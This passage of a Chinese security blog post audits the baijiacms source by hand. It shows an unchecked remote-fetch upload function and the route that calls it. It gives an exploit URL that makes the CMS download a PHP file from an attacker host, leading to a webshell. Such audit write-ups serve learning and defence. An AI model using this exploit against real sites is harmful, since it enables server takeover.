operator\">==</span><span class=\"token string single-quoted-string\">'music'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$extentions</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'mp3'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'wma'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'wav'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'amr'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'mp4'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$type</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'other'</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$extentions</span><span class=\"token operator\">=</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'gif'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'jpg'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'jpeg'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'png'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'mp3'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'wma'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'wav'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'amr'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'mp4'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'doc'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token operator\">...</span>\n\t<span class=\"token operator\">...</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里可以看到这个是进行了很多检测的，对文件类型进行了检测，且要求了后缀，所以这个函数应该是文件上传不了了，但还好它不止一个有关<code>upload</code>的函数，我们往下看到这样一个函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">fetch_net_file_upload</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$url</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\n\t<span class=\"token variable\">$extention</span> <span class=\"token operator\">=</span> <span class=\"token function\">pathinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">,</span><span class=\"token constant\">PATHINFO_EXTENSION</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$path</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'/attachment/'</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$extpath</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$extention</span><span class=\"token punctuation\">&#125;</span></span>/\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y/m/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t\t<span class=\"token function\">mkdirs</span><span class=\"token punctuation\">(</span><span class=\"token constant\">WEB_ROOT</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$path</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$extpath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$extention</span><span class=\"token punctuation\">&#125;</span></span>\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">SYSTEM_WEBROOT</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$path</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$extpath</span><span class=\"token operator\">.</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t\n\t\n\t<span class=\"token variable\">$file_tmp_name</span> <span class=\"token operator\">=</span> <span class=\"token constant\">SYSTEM_WEBROOT</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$path</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$extpath</span><span class=\"token operator\">.</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$file_relative_path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$extpath</span><span class=\"token operator\">.</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_tmp_name</span><span class=\"token punctuation\">,</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$result</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'message'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'提取失败.'</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t\t<span class=\"token variable\">$file_full_path</span> <span class=\"token operator\">=</span> <span class=\"token constant\">WEB_ROOT</span> <span class=\"token operator\">.</span><span class=\"token variable\">$path</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$extpath</span><span class=\"token operator\">.</span> <span class=\"token variable\">$filename</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token function\">file_save</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file_tmp_name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$extention</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file_full_path</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file_relative_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以发现这个只对文件进行了<code>pathinfo</code>函数处理，取出其后缀名，然后拼接路径及随机数字来组成文件名，那么我们如果通过这个函数进行文件上传，按理说就可以上传php文件实现getshell，接下来看看哪个文件利用了此函数<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533328.png\" alt=\"在这里插入图片描述\"><br>文件路由<code>system\\public\\class\\web\\file.php</code>，具体代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$do</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'fetch'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$url</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GPC</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token function\">fetch_net_file_upload</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$result</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'message'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'message'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>接下来我们只需要满足<code>do=fetch</code>，然后<code>url</code>中包含我们的文件，便可实现文件上传，我这里远程文件内容如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533426.png\" alt=\"在这里插入图片描述\"><br>接下来进行利用尝试。访问路由如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/baijiacms-master/index.php?mod=web&amp;do=file&amp;m=public&amp;op=fetch&amp;url=http://xxx.xxx.xxx.xxx/qwq.php</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533457.png\" alt=\"在这里插入图片描述\"><br>访问给出的文件路径<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141533487.png\" alt=\"在这里插入图片描述\"><br>可以发现此时已经实现了文件上传，如果传一句话木马即可Getshell。</p>\n<h1 id=\"后言\"><a href=\"#后言\" class=\"headerlink\" title=\"后言\"></a>后言</h1><p>本次CMS审计是小白的第一次大幅度利用手动搜索危险函数来寻找漏洞，共计耗时半周，对本小白来说已颇为吃力，其中颇多审计失败的点，虽审计失败，但仍感觉对代码能力有了进一步了解，也算有所收获。最后，如果文章中有错误，还望各位大师傅多多指正。</p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"https://xz.aliyun.com/t/10678#toc-5\">https://xz.aliyun.com/t/10678#toc-5</a><br><a href=\"https://xz.aliyun.com/t/9955#toc-0\">https://xz.aliyun.com/t/9955#toc-0</a><br><a href=\"http://moy1sec.com/2021/11/24/baijiacms-dai-ma-shen-ji/#toc-heading-4\">http://moy1sec.com/2021/11/24/baijiacms</a></p>\n","feature":true,"text":"前言之前审计的CMS大多是利用工具，即Seay+昆仑镜联动扫描出漏洞点，而后进行审计。感觉自己的能力仍与零无异，因此本次审计CMS绝大多数使用手动探测，即通过搜索危险函数的方式进行漏洞寻找，以此来提升审计能力，希望对正在学习代码审计的师傅能有所帮助。 环境搭建源码链接如下所示ht...","link":"","photos":[],"count_time":{"symbolsCount":"18k","symbolsTime":"16 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">环境搭建</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%A1%E8%AE%A1\"><span class=\"toc-text\">审计</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\"><span class=\"toc-text\">准备工作</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%B7%AF%E7%94%B1%E8%A7%A3%E6%9E%90\"><span class=\"toc-text\">路由解析</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E6%9F%A5%E6%89%BE\"><span class=\"toc-text\">漏洞查找</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">SQL注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%96%91%E7%82%B9%E4%B8%80%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89\"><span class=\"toc-text\">疑点一（失败）</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%96%91%E7%82%B9%E4%BA%8C%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89\"><span class=\"toc-text\">疑点二（失败）</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%BB%E6%84%8F%E7%9B%AE%E5%BD%95%E5%8F%8A%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4\"><span class=\"toc-text\">任意目录及文件删除</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%96%91%E7%82%B9%E4%B8%80\"><span class=\"toc-text\">疑点一</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%96%91%E7%82%B9%E4%BA%8C\"><span class=\"toc-text\">疑点二</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C\"><span class=\"toc-text\">命令执行</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%96%91%E7%82%B9%E4%B8%80%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89-1\"><span class=\"toc-text\">疑点一（失败）</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%96%91%E7%82%B9%E4%BA%8C-1\"><span class=\"toc-text\">疑点二</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96\"><span class=\"toc-text\">任意文件读取</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%96%91%E7%82%B9%E4%B8%80%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89-2\"><span class=\"toc-text\">疑点一（失败）</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0\"><span class=\"toc-text\">文件上传</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%96%91%E7%82%B9%E4%B8%80-1\"><span class=\"toc-text\">疑点一</span></a></li></ol></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%90%8E%E8%A8%80\"><span class=\"toc-text\">后言</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE\"><span class=\"toc-text\">参考文献</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"JAVA基础语法-学习笔记","uid":"a1b84c0190a37e192f2165ae5ca9a78a","slug":"JAVA基础语法-学习笔记","date":"2022-11-11T16:54:30.000Z","updated":"2023-04-25T11:33:06.000Z","comments":true,"path":"api/articles/JAVA基础语法-学习笔记.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141528659.jpeg","text":"day01文件运行过程首先呢，我们创一个后缀名为java的文件，而后写入内容其次，我们以管理员身份打开cmd，通过javac运行来得到class文件最后，通过java命令来将刚刚生成的clss文件运行这就是整个过程，图示如下图所示注：首先写的那个java文件称作源文件，通过jav...","link":"","photos":[],"count_time":{"symbolsCount":"35k","symbolsTime":"32 mins."},"categories":[{"name":"JAVA","slug":"JAVA","count":10,"path":"api/categories/JAVA.json"}],"tags":[{"name":"语言学习","slug":"语言学习","count":3,"path":"api/tags/语言学习.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"初探HTTP请求走私","uid":"b78771140557d7dad4bcf7d70597ef1a","slug":"初探HTTP请求走私","date":"2022-11-02T17:41:30.000Z","updated":"2023-03-14T07:09:12.000Z","comments":true,"path":"api/articles/初探HTTP请求走私.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141509209.png","text":"声明文章首发于跳跳糖社区https://tttang.com/archive/1808/ 前言ISCC2022[让我康康]这道赛题在接触时令我记忆犹新，之前由于学习知识其他也一直没有对HTTP请求走私进行相关学习，最近学习过后简单总结如下，希望能对正在学习HTTP请求走私的师傅有...","link":"","photos":[],"count_time":{"symbolsCount":"21k","symbolsTime":"19 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"HTTP请求走私","slug":"HTTP请求走私","count":1,"path":"api/tags/HTTP请求走私.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":false}}